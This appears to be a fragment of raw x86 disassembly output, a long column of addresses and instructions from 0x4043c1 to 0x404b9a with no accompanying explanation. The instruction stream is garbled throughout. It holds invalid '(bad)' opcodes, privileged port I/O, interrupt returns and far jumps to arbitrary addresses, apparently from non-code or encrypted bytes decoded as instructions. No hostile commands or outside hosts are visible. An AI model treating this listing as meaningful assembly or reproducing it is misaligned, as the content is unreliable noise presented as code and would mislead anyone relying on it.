  4043c1:	in     eax,dx
  4043c2:	push   esp
  4043c3:	jbe    0x4043ed
  4043c5:	and    al,0x9e
  4043c7:	add    BYTE PTR [eax-0x61],al
  4043ca:	inc    esi
  4043cb:	sub    dl,dl
  4043cd:	pop    edi
  4043ce:	out    0x64,al
  4043d0:	retf   
  4043d1:	jmp    0xaa0bcdc3
  4043d6:	sbb    DWORD PTR [ecx],edx
  4043d8:	jno    0x4043bc
  4043da:	mov    cs,WORD PTR [edi-0x49241b60]
  4043e0:	cmp    ah,BYTE PTR ds:0x665ebd6a
  4043e6:	xor    ch,BYTE PTR [ebx-0x1]
  4043e9:	mov    dl,0xc
  4043eb:	stos   DWORD PTR es:[edi],eax
  4043ec:	cmc    
  4043ed:	jno    0x40440e
  4043ef:	cld    
  4043f0:	mov    ebx,0xcbb9bb15
  4043f5:	sub    al,0x8b
  4043f7:	pusha  
  4043f8:	xchg   edx,eax
  4043f9:	jg     0x404404
  4043fb:	(bad)  
  4043fc:	mov    eax,ds:0xaba9a9ef
  404401:	ins    DWORD PTR es:[edi],dx
  404402:	out    0xc6,al
  404404:	stos   BYTE PTR es:[edi],al
  404405:	lods   eax,DWORD PTR ds:[esi]
  404406:	jno    0x4043c3
  404408:	cmp    ebx,eax
  40440a:	popa   
  40440b:	pop    edx
  40440c:	jno    0x4043da
  40440e:	ins    BYTE PTR es:[edi],dx
  40440f:	mov    dh,0x3d
  404411:	inc    ebp
  404412:	call   0xbe84:0x157f623c
  404419:	xor    DWORD PTR [edx+0x2c053f7a],edi
  40441f:	sbb    eax,0x3b70cb34
  404424:	inc    esp
  404425:	mov    bh,0x43
  404427:	out    dx,eax
  404428:	jle    0x404447
  40442a:	iret   
  40442b:	cs scas eax,DWORD PTR es:[edi]
  40442d:	cwde   
  40442e:	mov    ebp,0x43eb3924
  404433:	mov    ds:0xbc0780e4,al
  404438:	gs loope 0x40441a
  40443b:	stos   DWORD PTR es:[edi],eax
  40443c:	xchg   ebp,eax
  40443d:	xchg   esp,eax
  40443e:	(bad)  
  40443f:	in     al,0x79
  404441:	sahf   
  404442:	sbb    cl,cl
  404444:	mov    WORD PTR [esi],fs
  404446:	lahf   
  404447:	pop    eax
  404448:	mov    cl,0xe6
  40444a:	fwait
  40444b:	mov    eax,ds:0xa6aa2a8c
  404450:	adc    ebp,esi
  404452:	icebp  
  404453:	icebp  
  404454:	and    al,0x35
  404456:	push   es
  404457:	jo     0x404416
  404459:	mov    cl,0x1b
  40445b:	xchg   ebp,eax
  40445c:	div    DWORD PTR [esi+esi*8-0x34a48a53]
  404463:	test   BYTE PTR [edx-0x4d81cac0],ah
  404469:	outs   dx,BYTE PTR ds:[esi]
  40446a:	pop    ebp
  40446b:	mov    eax,0x585d52c9
  404470:	xor    al,0x83
  404472:	inc    esp
  404473:	xor    al,0xaf
  404475:	pushf  
  404476:	jno    0x40445e
  404478:	in     eax,0x22
  40447a:	push   edi
  40447b:	stc    
  40447c:	cmp    al,0x3b
  40447e:	(bad)  
  40447f:	mov    ah,0x5a
  404481:	push   ecx
  404482:	cli    
  404483:	pop    ss
  404484:	pop    ds
  404485:	aaa    
  404486:	stos   DWORD PTR es:[edi],eax
  404487:	add    DWORD PTR [edi+esi*1],0x43
  40448b:	mov    edx,0x31d87f62
  404490:	fbstp  TBYTE PTR [ecx]
  404492:	sbb    eax,0x9626aff
  404497:	inc    esi
  404498:	mov    ebp,0x5bdee162
  40449d:	inc    ebx
  40449e:	retf   0x9103
  4044a1:	ret    0xaf64
  4044a4:	jg     0x40451d
  4044a6:	inc    edi
  4044a7:	ins    BYTE PTR es:[edi],dx
  4044a8:	pop    edi
  4044a9:	shl    dh,0xc5
  4044ac:	mov    ebx,0xcf9e76a
  4044b1:	jne    0x40444f
  4044b3:	ffree  st(5)
  4044b5:	std    
  4044b6:	mov    DWORD PTR [edx-0x23],eax
  4044b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044ba:	sub    al,0xfb
  4044bc:	fcom   QWORD PTR [edx-0x4a]
  4044bf:	cdq    
  4044c0:	(bad)
  4044c3:	pushf  
  4044c4:	call   0xf071a979
  4044c9:	xchg   ebp,eax
  4044ca:	shufps xmm1,XMMWORD PTR [edi+0x54],0x2f
  4044cf:	dec    edx
  4044d0:	mov    ecx,0xeb87da8
  4044d5:	jg     0x404528
  4044d7:	inc    ebp
  4044d8:	jle    0x4044f1
  4044da:	and    esi,DWORD PTR [esi-0x4d803fd]
  4044e0:	dec    esp
  4044e1:	mov    es,WORD PTR [edx-0x6c]
  4044e4:	cmp    bl,0x23
  4044e7:	outs   dx,BYTE PTR ds:[esi]
  4044e8:	in     al,dx
  4044e9:	inc    esi
  4044ea:	push   es
  4044eb:	imul   edx,DWORD PTR [ebx+0x70],0x53bca3ba
  4044f2:	lds    ecx,FWORD PTR [ebp-0x3a]
  4044f5:	fdiv   QWORD PTR [ebp+0x324afb6a]
  4044fb:	xlat   BYTE PTR ds:[ebx]
  4044fc:	test   al,0xad
  4044fe:	call   0x7c5b8c99
  404503:	cld    
  404504:	pop    esp
  404505:	adc    bh,BYTE PTR [ebx+0x11071c38]
  40450b:	jns    0x4044ca
  40450d:	int    0xa6
  40450f:	cwde   
  404510:	dec    eax
  404511:	in     al,0xc0
  404513:	cmc    
  404514:	cs (bad) 
  404516:	sub    eax,0x610b09d0
  40451b:	les    esp,FWORD PTR gs:[ebx]
  40451e:	rcr    DWORD PTR [ebp+0x167d9621],1
  404524:	loope  0x404547
  404526:	and    eax,0xeab588cb
  40452b:	xor    DWORD PTR ds:[ebp-0x75],ecx
  40452f:	add    edx,edx
  404531:	loop   0x4045a0
  404533:	push   ds
  404534:	addr16 add eax,0xdd07c9bd
  40453a:	lahf   
  40453b:	pop    es
  40453c:	sub    esi,eax
  40453e:	inc    eax
  40453f:	fidiv  WORD PTR [esi]
  404541:	fnstcw WORD PTR [edx+ebp*4]
  404544:	and    eax,0xe29e8358
  404549:	outs   dx,BYTE PTR ds:[esi]
  40454a:	mov    al,0x43
  40454c:	sub    esp,DWORD PTR [edx]
  40454e:	out    dx,eax
  40454f:	inc    ecx
  404550:	fs mov ecx,0xde111658
  404556:	jns    0x404549
  404558:	(bad)
  40455c:	xchg   esi,eax
  40455d:	xchg   ebx,eax
  40455e:	mov    ebx,0x74776cb9
  404563:	call   0x6ac:0x491b9063
  40456a:	or     DWORD PTR [eax],esp
  40456c:	sbb    esp,DWORD PTR [ebx]
  40456e:	xchg   ebx,eax
  40456f:	pusha  
  404570:	pushf  
  404571:	sbb    ah,BYTE PTR [esi-0x20c5d0f9]
  404577:	sub    dl,BYTE PTR [ebp-0x75]
  40457a:	push   eax
  40457b:	sub    eax,0x4b456c71
  404580:	push   esp
  404581:	bound  ecx,QWORD PTR [esi+0x75]
  404584:	int3   
  404585:	inc    esi
  404586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404587:	sbb    dl,BYTE PTR [edi]
  404589:	in     al,0x60
  40458b:	fbstp  TBYTE PTR [ebp+0x6a28ae8e]
  404591:	push   es
  404592:	ss push esp
  404594:	cmp    eax,0x28fa5f52
  404599:	shr    BYTE PTR [ebx],cl
  40459b:	fstp   DWORD PTR [edi]
  40459d:	inc    edx
  40459e:	xor    al,bl
  4045a0:	adc    esp,edx
  4045a2:	and    eax,0xa4b02177
  4045a7:	lock das 
  4045a9:	out    dx,eax
  4045aa:	ins    DWORD PTR es:[edi],dx
  4045ab:	hlt    
  4045ac:	xor    DWORD PTR [ebx],edi
  4045ae:	sub    al,0xe8
  4045b0:	sbb    esi,DWORD PTR [ebp+0x39]
  4045b3:	adc    eax,0x1cb8bae4
  4045b8:	loope  0x4045c0
  4045ba:	(bad)  
  4045bb:	stc    
  4045bc:	rcl    edx,0x97
  4045bf:	inc    edi
  4045c0:	cmp    dh,BYTE PTR [esi+0x65]
  4045c3:	inc    edi
  4045c4:	in     eax,0x4c
  4045c6:	enter  0xf42d,0xb0
  4045ca:	lock cmp edx,DWORD PTR cs:[esi]
  4045ce:	xchg   esi,eax
  4045cf:	mov    dl,0x7a
  4045d1:	(bad)  
  4045d2:	retf   
  4045d3:	xor    bl,BYTE PTR fs:[ebx-0x429af2b7]
  4045da:	shl    DWORD PTR [edx],1
  4045dc:	outs   dx,BYTE PTR ds:[esi]
  4045dd:	test   BYTE PTR [ebx+0x52af9c2d],bh
  4045e3:	ins    BYTE PTR es:[edi],dx
  4045e4:	pop    es
  4045e5:	pushf  
  4045e6:	jo     0x4045bb
  4045e8:	mov    bl,0x3e
  4045ea:	das    
  4045eb:	fcom   DWORD PTR [ebp-0x18b0027e]
  4045f1:	jnp    0x404597
  4045f3:	adc    eax,0x38101cf7
  4045f8:	mov    esi,0x7f9c615d
  4045fd:	pop    edx
  4045fe:	ror    ebx,0x98
  404601:	cmp    ebx,esi
  404603:	xchg   DWORD PTR [esi-0xa],esp
  404606:	sbb    eax,DWORD PTR [eax]
  404608:	std    
  404609:	push   ebp
  40460a:	jp     0x40465e
  40460c:	retf   0x7e86
  40460f:	aas    
  404610:	sub    BYTE PTR [eax+eax*8+0x65495e58],al
  404617:	cdq    
  404618:	enter  0x1f18,0x59
  40461c:	or     bh,cl
  40461e:	sbb    DWORD PTR [esi-0x6258d1d9],ebp
  404624:	aas    
  404625:	retf   0x4e54
  404628:	mov    al,ds:0xb1731af2
  40462d:	mov    cl,0xc8
  40462f:	cmp    DWORD PTR [eax-0x62],edi
  404632:	fcomp  QWORD PTR [edx-0x284eda6f]
  404638:	adc    dh,BYTE PTR [esi-0x109c69e5]
  40463e:	int    0xca
  404640:	dec    ecx
  404641:	(bad)
  404645:	cmp    esi,DWORD PTR [eax-0x361220c8]
  40464b:	push   edi
  40464c:	rcr    ch,0x26
  40464f:	iret   
  404650:	cdq    
  404651:	and    ebp,ebx
  404653:	dec    eax
  404654:	jl     0x404671
  404656:	dec    ebp
  404657:	and    BYTE PTR [eax-0x23d5f0be],cl
  40465d:	xor    BYTE PTR [eax+esi*8-0x59b460fb],dl
  404664:	xor    al,0x86
  404666:	sub    DWORD PTR [edx],edx
  404668:	jns    0x404691
  40466a:	(bad)  
  40466b:	cdq    
  40466c:	mov    eax,0xc293f27b
  404671:	mov    dl,dl
  404673:	in     eax,0x16
  404675:	cdq    
  404676:	stos   DWORD PTR es:[edi],eax
  404677:	mov    DWORD PTR [ecx],ebp
  404679:	xor    ebp,DWORD PTR [edi+0x42539b05]
  40467f:	mov    ebp,0xd46d2797
  404684:	jl     0x40464b
  404686:	xor    esi,edx
  404688:	dec    eax
  404689:	jecxz  0x4046eb
  40468b:	test   DWORD PTR [eax-0x4a5e9846],ebp
  404691:	inc    ecx
  404692:	clc    
  404693:	rcl    DWORD PTR [ebp-0x7e4247e4],0x6c
  40469a:	ret    
  40469b:	push   esi
  40469c:	mov    esi,ebp
  40469e:	xlat   BYTE PTR ds:[ebx]
  40469f:	cmp    al,0x2f
  4046a1:	push   cs
  4046a2:	cmp    DWORD PTR [esi-0x51],0x555f0617
  4046a9:	repz rcl DWORD PTR [edx],cl
  4046ac:	push   0x30f675ad
  4046b1:	jl     0x404721
  4046b3:	mov    DWORD PTR [ebx],edi
  4046b5:	(bad)  
  4046b6:	fisttp DWORD PTR [esi]
  4046b8:	mov    cl,0x1e
  4046ba:	cwde   
  4046bb:	or     edx,DWORD PTR [eax]
  4046bd:	cmp    al,BYTE PTR [esi+0x4b]
  4046c0:	mov    ah,0xcd
  4046c2:	jo     0x4046f0
  4046c4:	dec    eax
  4046c5:	stc    
  4046c6:	inc    edi
  4046c7:	or     edx,esi
  4046c9:	mov    DWORD PTR [eax-0x30f64d99],esp
  4046cf:	jne    0x404747
  4046d1:	sbb    al,0xd
  4046d3:	scas   eax,DWORD PTR es:[edi]
  4046d4:	imul   esi,DWORD PTR [eax+0x16],0x889feff6
  4046db:	lock and DWORD PTR [esi+0x48],ebp
  4046df:	into   
  4046e0:	mov    edi,0xdaae0a6f
  4046e5:	jno    0x404719
  4046e7:	fsub   st(0),st
  4046e9:	bound  esp,QWORD PTR [esi+0xe874574]
  4046ef:	pusha  
  4046f0:	or     ch,BYTE PTR [ecx]
  4046f2:	pop    edx
  4046f3:	daa    
  4046f4:	rcl    BYTE PTR [edx+0x71],cl
  4046f7:	add    eax,0xc243090a
  4046fc:	sub    al,0x57
  4046fe:	in     eax,0x61
  404700:	into   
  404701:	fild   DWORD PTR ds:0x80e93ebb
  404707:	popa   
  404708:	mov    ds:0x632fb688,eax
  40470d:	sub    ecx,DWORD PTR [edx+0x19]
  404710:	sar    al,cl
  404712:	mov    ?,WORD PTR [edx+eiz*8-0x3bc920c2]
  404719:	ror    BYTE PTR [edx+0x33],cl
  40471c:	cwde   
  40471d:	pop    ebx
  40471e:	fmulp  st(7),st
  404720:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404721:	xchg   esi,eax
  404722:	xchg   ecx,eax
  404723:	mov    edx,0x44fdbc59
  404728:	adc    edi,eax
  40472a:	ins    DWORD PTR es:[edi],dx
  40472b:	fdiv   st(2),st
  40472d:	arpl   WORD PTR [edi-0x2d660c99],bp
  404733:	cld    
  404734:	or     al,al
  404736:	ds ins DWORD PTR es:[di],dx
  404739:	push   edx
  40473a:	jmp    0xf53d2e8b
  40473f:	jbe    0x40478b
  404741:	add    DWORD PTR [ecx-0x7f],edx
  404744:	mov    ch,0xcc
  404746:	xor    edx,DWORD PTR [esi+0x12]
  404749:	fs fs xchg ecx,eax
  40474c:	out    dx,al
  40474d:	mov    esi,0xdfb2c2aa
  404752:	cmp    eax,DWORD PTR [ecx]
  404754:	aas    
  404755:	data16 shr BYTE PTR [ecx-0x1ecc5e69],0x27
  40475d:	jl     0x4046e2
  40475f:	jne    0x404714
  404761:	mov    esp,0x972c525e
  404766:	sub    al,0x4c
  404768:	fnstsw WORD PTR [eax]
  40476a:	dec    ebx
  40476b:	xor    al,0xe2
  40476d:	mov    dh,0x8a
  40476f:	jmp    0xba91:0xe7b5e83a
  404776:	(bad)  
  404777:	pand   mm7,QWORD PTR [ecx]
  40477a:	cmc    
  40477b:	lds    edi,FWORD PTR [esp+edx*8]
  40477e:	push   0x4d
  404780:	xor    DWORD PTR [ebx-0x1c340422],edx
  404786:	mov    edi,0xe2438acb
  40478b:	ss mov ch,0x33
  40478e:	push   edx
  40478f:	jmp    0xd65a04f9
  404794:	aam    0xd9
  404796:	in     al,0xb4
  404798:	mov    ds:0xe4d6729f,al
  40479d:	inc    eax
  40479e:	adc    al,0xb2
  4047a0:	fist   DWORD PTR [ecx-0x12684723]
  4047a6:	(bad)  
  4047a8:	jnp    0x4047f5
  4047aa:	sbb    esp,esp
  4047ac:	into   
  4047ad:	mov    ebp,0x1294ef2d
  4047b2:	xchg   ebp,eax
  4047b3:	add    al,0xda
  4047b5:	adc    al,0x80
  4047b7:	pop    ecx
  4047b8:	int3   
  4047b9:	std    
  4047ba:	icebp  
  4047bb:	pop    eax
  4047bc:	std    
  4047bd:	mov    ah,BYTE PTR [edi-0x71e4666f]
  4047c3:	fidiv  WORD PTR [esi+ecx*1-0x3083a932]
  4047ca:	cdq    
  4047cb:	in     al,dx
  4047cc:	mov    eax,ds:0x7a1a0756
  4047d2:	cmp    BYTE PTR [esp+esi*8-0x53],al
  4047d6:	add    esi,edi
  4047d8:	imul   eax,DWORD PTR ds:0xb00fcf83,0x507d48b1
  4047e2:	xchg   esp,eax
  4047e3:	dec    ebx
  4047e4:	ret    0x18fd
  4047e7:	or     al,0x5c
  4047e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047ea:	jae    0x40480a
  4047ec:	mov    edx,0xce6965c2
  4047f1:	mul    BYTE PTR [esi-0x7a]
  4047f4:	div    BYTE PTR [ebx]
  4047f6:	push   ds
  4047f7:	lea    ebp,[ebx]
  4047f9:	into   
  4047fa:	fwait
  4047fb:	jnp    0x404861
  4047fd:	xor    BYTE PTR [esi],ah
  4047ff:	out    dx,eax
  404800:	scas   al,BYTE PTR es:[edi]
  404801:	inc    esp
  404802:	sbb    cl,BYTE PTR [esi]
  404804:	dec    edi
  404805:	cmp    eax,DWORD PTR [eax]
  404807:	or     DWORD PTR [ebp-0x41],esi
  40480a:	dec    esp
  40480b:	or     eax,0x99144f05
  404810:	call   0x33670a26
  404815:	stos   BYTE PTR es:[edi],al
  404816:	fdiv   DWORD PTR [ecx-0x53]
  404819:	xchg   esp,eax
  40481a:	push   ebx
  40481b:	int3   
  40481c:	jbe    0x4047ab
  40481e:	dec    eax
  40481f:	es cwde 
  404821:	out    0x6e,eax
  404823:	into   
  404824:	xor    eax,DWORD PTR [ecx]
  404826:	mov    edx,0xd8d82d66
  40482b:	pop    ebp
  40482c:	dec    ebx
  40482d:	pop    es
  40482e:	xchg   edx,eax
  40482f:	sahf   
  404830:	sbb    BYTE PTR ds:0xf592a155,dh
  404836:	adc    bl,BYTE PTR [esi+0x24]
  404839:	pop    ebp
  40483a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40483b:	dec    ebp
  40483c:	adc    DWORD PTR [ebx+0x6a],ebp
  40483f:	fldcw  WORD PTR [ebx+0x28270b60]
  404845:	push   eax
  404846:	outs   dx,DWORD PTR ds:[esi]
  404847:	out    dx,eax
  404848:	or     BYTE PTR [ebx+0x191929f3],0xb5
  40484f:	mov    dl,0x61
  404851:	fisttp QWORD PTR [edi+ebx*1+0x4a789a6b]
  404858:	mov    ds:0xbc963583,al
  40485d:	cld    
  40485e:	in     eax,dx
  40485f:	lock inc edi
  404861:	mov    al,0x68
  404863:	neg    DWORD PTR [edx+0x4]
  404866:	lock (bad) 
  404869:	dec    esp
  40486a:	outs   dx,BYTE PTR ds:[esi]
  40486b:	addr16 mov bl,0xfd
  40486e:	and    BYTE PTR [ebp-0x48],bl
  404871:	leave  
  404872:	das    
  404873:	aaa    
  404874:	mov    BYTE PTR [edi-0x2ea462d8],dh
  40487a:	jo     0x404801
  40487c:	or     BYTE PTR [ebx],0xa0
  40487f:	scas   eax,DWORD PTR es:[edi]
  404880:	cli    
  404881:	lods   eax,DWORD PTR ds:[esi]
  404882:	aam    0xa5
  404884:	mov    al,ds:0xfca3c203
  404889:	mov    edi,0xb214b4b5
  40488e:	(bad)  
  40488f:	nop
  404890:	ja     0x404911
  404892:	es pusha 
  404894:	jne    0x40487b
  404896:	and    DWORD PTR [ebx+0x39cef6df],eax
  40489c:	iret   
  40489d:	push   ss
  40489e:	hlt    
  40489f:	retf   
  4048a0:	lds    edi,FWORD PTR [eax+0x11]
  4048a3:	shl    DWORD PTR [eax+0x70],cl
  4048a6:	push   cs
  4048a7:	ror    bl,0xdb
  4048aa:	jg     0x4048eb
  4048ac:	ret    0x5399
  4048af:	ret    
  4048b0:	fcomp  QWORD PTR [ecx-0x55869820]
  4048b6:	leave  
  4048b7:	popa   
  4048b8:	adc    al,0x70
  4048ba:	push   ecx
  4048bb:	sub    al,0xb3
  4048bd:	pop    edi
  4048be:	push   edi
  4048bf:	ficom  WORD PTR [eax+ebp*2-0x62]
  4048c3:	dec    ecx
  4048c4:	loope  0x404929
  4048c6:	jl     0x4048a0
  4048c8:	push   es
  4048c9:	dec    ebp
  4048ca:	enter  0xbfa9,0x17
  4048ce:	cli    
  4048cf:	mov    ds:0x589ef378,al
  4048d4:	dec    eax
  4048d5:	icebp  
  4048d6:	ret    0x1552
  4048d9:	clc    
  4048da:	jge    0x4048fb
  4048dc:	cli    
  4048dd:	rcl    ah,1
  4048df:	sub    al,0x80
  4048e1:	cmp    DWORD PTR [eax-0x36f30f03],0x2
  4048e8:	mov    edx,0xdfa770f9
  4048ed:	or     DWORD PTR [ecx-0x2edb9623],edi
  4048f3:	push   DWORD PTR [ebp+0x6a]
  4048f6:	jae    0x40494a
  4048f8:	dec    ebp
  4048f9:	mov    bl,ch
  4048fb:	in     al,dx
  4048fc:	and    DWORD PTR [edi],0x784ea584
  404902:	jecxz  0x404981
  404904:	mov    bh,0xbb
  404906:	cmc    
  404907:	div    al
  404909:	pop    ss
  40490a:	push   ds
  40490b:	inc    ebx
  40490c:	push   esi
  40490d:	mov    ds:0x34f11422,al
  404912:	idiv   ecx
  404914:	sub    BYTE PTR [edx],ch
  404916:	cdq    
  404917:	shl    DWORD PTR [ebx-0x5b69942a],cl
  40491d:	jle    0x40490d
  40491f:	inc    edx
  404920:	repz imul esi,edi,0xffffffcb
  404924:	add    eax,0xe6d5cb3f
  404929:	mov    WORD PTR [esi-0x7],ss
  40492c:	inc    DWORD PTR [ecx-0x3d0cdbc9]
  404932:	jae    0x404940
  404934:	mul    dh
  404936:	or     DWORD PTR [ebp+0x79],edx
  404939:	shr    dl,1
  40493b:	enter  0x1b1c,0x6a
  40493f:	pusha  
  404940:	retf   0x5a07
  404943:	cmc    
  404944:	mov    cl,0x84
  404946:	inc    ecx
  404947:	push   esi
  404948:	mov    bl,0x8f
  40494a:	add    BYTE PTR [eax+0x3401340b],0xbe
  404951:	dec    edi
  404952:	sbb    ecx,ecx
  404954:	popf   
  404955:	std    
  404956:	nop
  404957:	es loopne 0x4049b9
  40495a:	jmp    0x40a4:0x1139e46
  404961:	mov    cl,0xd9
  404963:	mov    ebx,0x2c867edf
  404968:	icebp  
  404969:	mov    ch,BYTE PTR [eax-0x2f]
  40496c:	out    dx,al
  40496d:	leave  
  40496e:	popf   
  40496f:	cli    
  404970:	xchg   ebx,eax
  404971:	in     eax,0x8e
  404973:	dec    ebp
  404974:	test   al,0xf1
  404976:	push   ds
  404977:	or     bl,cl
  404979:	adc    eax,0xa6f9bf4f
  40497e:	cmp    BYTE PTR [edi+eax*4+0x17],bl
  404982:	out    0xd,eax
  404984:	test   BYTE PTR [eax-0x40],ch
  404987:	xor    BYTE PTR [esp+ecx*4+0x5b2ec952],dh
  40498e:	rcr    DWORD PTR [ebx],cl
  404990:	jae    0x4049fc
  404992:	(bad)  
  404993:	loopne 0x404995
  404995:	mov    ecx,0x715a65c1
  40499a:	sbb    bh,BYTE PTR [ebx-0x1caec755]
  4049a0:	sub    ah,BYTE PTR [ebx-0x2f]
  4049a3:	clc    
  4049a4:	xor    eax,0xa539a87
  4049a9:	fbld   TBYTE PTR [ebp+0x76]
  4049ac:	ret    
  4049ad:	sar    BYTE PTR [edx],cl
  4049af:	fwait
  4049b0:	jns    0x404985
  4049b2:	jmp    DWORD PTR [edx]
  4049b4:	test   al,0xa8
  4049b6:	add    DWORD PTR ds:[esi],ecx
  4049b9:	mov    DWORD PTR [ebx-0x2bac71c5],esp
  4049bf:	lods   eax,DWORD PTR ds:[esi]
  4049c0:	pop    ds
  4049c1:	test   al,0x96
  4049c3:	or     al,0x94
  4049c5:	sub    DWORD PTR [ebp+0x59442cdb],ebx
  4049cb:	push   ss
  4049cc:	sbb    dl,BYTE PTR [ebp-0x9]
  4049cf:	adc    eax,0xe3d75319
  4049d4:	retf   0x54c1
  4049d7:	je     0x404998
  4049d9:	test   BYTE PTR [ebx],cl
  4049db:	inc    eax
  4049dc:	loopne 0x404a1b
  4049de:	mov    bh,0xa4
  4049e0:	or     eax,0xf5ba0f99
  4049e5:	xor    DWORD PTR [eax-0x10],ebp
  4049e8:	call   DWORD PTR [edx+0x1db4b623]
  4049ee:	mov    edi,0xc5fb858a
  4049f3:	inc    eax
  4049f4:	mov    edx,DWORD PTR [ebx]
  4049f6:	xor    ch,ch
  4049f8:	mov    bh,0x1b
  4049fa:	and    al,0x1
  4049fc:	(bad)  
  4049fd:	pop    esi
  4049fe:	inc    esi
  4049ff:	bnd jg 0x404a33
  404a02:	into   
  404a03:	out    dx,al
  404a04:	jbe    0x404a15
  404a06:	jmp    0xad729f62
  404a0b:	mov    dh,0xb0
  404a0d:	inc    ebp
  404a0e:	imul   ebp,DWORD PTR [ebx+0x77ed7b13],0xffffffb7
  404a15:	out    0x69,al
  404a17:	cmp    al,0x2d
  404a19:	je     0x404a3d
  404a1b:	dec    eax
  404a1c:	sbb    al,0x40
  404a1e:	jne    0x4049fc
  404a20:	call   0x785b2fe3
  404a25:	imul   esi,DWORD PTR [ebx-0x1a],0xe08e961b
  404a2c:	dec    ebx
  404a2d:	les    esi,FWORD PTR [di+0x268f]
  404a32:	gs jns 0x404aa3
  404a35:	jae    0x404a08
  404a37:	dec    eax
  404a38:	mov    ds:0xba4d41b5,eax
  404a3d:	cli    
  404a3e:	mov    ebp,0xaa751e15
  404a43:	xchg   edx,eax
  404a44:	adc    al,0xb3
  404a46:	jo     0x404aa2
  404a48:	sbb    DWORD PTR [edx+0xf],ebx
  404a4b:	shl    ah,1
  404a4d:	gs jle 0x404a2c
  404a50:	jmp    DWORD PTR [ecx]
  404a52:	push   cs
  404a53:	xor    BYTE PTR [ebx+0x2f],al
  404a56:	fild   QWORD PTR [esi+ebx*2-0x34a06dc2]
  404a5d:	je     0x404a99
  404a5f:	rol    BYTE PTR [ebx+0x16],0xa5
  404a63:	sub    eax,0x513e439
  404a68:	dec    esp
  404a69:	dec    edi
  404a6a:	loope  0x4049fb
  404a6c:	xor    esp,ecx
  404a6e:	sub    ebx,0xffffffd9
  404a71:	sbb    al,0xf3
  404a73:	stos   DWORD PTR es:[edi],eax
  404a74:	sbb    eax,0x8e21a867
  404a79:	ins    BYTE PTR es:[edi],dx
  404a7a:	cwde   
  404a7b:	lahf   
  404a7c:	stos   DWORD PTR es:[edi],eax
  404a7d:	in     al,dx
  404a7e:	jp     0x404af7
  404a80:	sbb    eax,0xe2f91a0a
  404a85:	es icebp 
  404a87:	imul   esp,DWORD PTR [eax],0xc47a8d86
  404a8d:	cmp    al,0x3c
  404a8f:	adc    DWORD PTR [ecx-0x65],eax
  404a92:	mov    esp,0x8ebfb3d
  404a97:	jl     0x404ad6
  404a99:	pop    es
  404a9a:	mov    bh,0x3d
  404a9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a9d:	cli    
  404a9e:	ss adc edi,esi
  404aa1:	sub    ebp,eax
  404aa3:	inc    esp
  404aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404aa5:	test   BYTE PTR [edi],0xeb
  404aa8:	dec    BYTE PTR [ecx+0x309c8b32]
  404aae:	retf   
  404aaf:	jmp    0x404aea
  404ab1:	mov    ch,0x69
  404ab3:	mov    ebp,0x821572ac
  404ab8:	in     al,0xb6
  404aba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404abb:	in     al,dx
  404abc:	pop    ss
  404abd:	add    DWORD PTR [esi+0x2d62c9d8],ebx
  404ac3:	imul   eax,DWORD PTR [eax+0x14],0x1c
  404ac7:	loop   0x404b29
  404ac9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404aca:	pop    edx
  404acb:	or     al,0x2c
  404acd:	jg     0x404b29
  404acf:	loope  0x404ac3
  404ad1:	stc    
  404ad2:	lea    ebp,[ecx+0x4ac809f3]
  404ad8:	shr    DWORD PTR [edx+0x44ab1d4e],1
  404ade:	add    ebp,ecx
  404ae0:	jns    0x404ad1
  404ae2:	inc    edx
  404ae3:	add    cl,bh
  404ae5:	repz int 0xc8
  404ae8:	loop   0x404a86
  404aea:	(bad)  
  404aeb:	mov    bl,0xe1
  404aed:	add    eax,0xdf469f95
  404af2:	loope  0x404b41
  404af4:	push   cs
  404af5:	mov    al,0xa8
  404af7:	loope  0x404aea
  404af9:	mov    eax,ds:0x1bbfef58
  404afe:	and    BYTE PTR [esi-0x5a83c9df],0x85
  404b05:	das    
  404b06:	fild   QWORD PTR [ebp+0x2c]
  404b09:	mov    ecx,0x1d4893bb
  404b0e:	(bad)  
  404b0f:	and    DWORD PTR [ebp-0x7e067af],ebx
  404b15:	sbb    DWORD PTR [edi+0x7d],edi
  404b18:	mov    cl,0x49
  404b1a:	mov    dh,0x21
  404b1c:	sahf   
  404b1d:	(bad)  
  404b1e:	(bad)  
  404b1f:	lea    edi,[eax]
  404b21:	ret    0xd13c
  404b24:	call   0x53cf1521
  404b29:	lods   eax,DWORD PTR ds:[esi]
  404b2a:	lods   eax,DWORD PTR ds:[esi]
  404b2b:	jmp    0x5026:0x9fee25d
  404b32:	cmp    al,0xb0
  404b34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b35:	jmp    0xae71:0x97a0b542
  404b3c:	push   ebx
  404b3d:	push   ds
  404b3e:	sub    BYTE PTR ds:0x5a12b9fa,ah
  404b44:	fild   DWORD PTR [esp+eax*4+0x16]
  404b48:	in     al,dx
  404b49:	pop    es
  404b4a:	sub    al,BYTE PTR [esi]
  404b4c:	mov    ds:0x88f8385b,al
  404b51:	in     eax,dx
  404b52:	or     eax,0x76dcf61c
  404b57:	push   0xb049830a
  404b5c:	pop    ecx
  404b5d:	fwait
  404b5e:	cmp    al,0x93
  404b60:	daa    
  404b61:	aaa    
  404b62:	loope  0x404bc9
  404b64:	clc    
  404b65:	inc    edx
  404b66:	jbe    0x404ae9
  404b68:	iret   
  404b69:	imul   ebx,edx,0x5590adea
  404b6f:	cmp    DWORD PTR [edx],esi
  404b71:	adc    ch,BYTE PTR gs:[esi+0x58845b81]
  404b78:	jg     0x404b2e
  404b7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b7b:	inc    edi
  404b7c:	aad    0x86
  404b7e:	pop    fs
  404b80:	(bad)  
  404b82:	clc    
  404b83:	jmp    0x8ce04355
  404b88:	dec    eax
  404b89:	and    DWORD PTR [ebx-0x28d1c271],ebx
  404b8f:	adc    al,0x63
  404b91:	pop    ss
  404b92:	xchg   ebp,eax
  404b93:	mov    bl,0x5a
  404b95:	pop    edi
  404b96:	xchg   ecx,eax
  404b97:	push   eax
  404b99:	hlt    
  404b9a:	imul   edx,DWORD PTR [ebp-0x14],0x9563f991
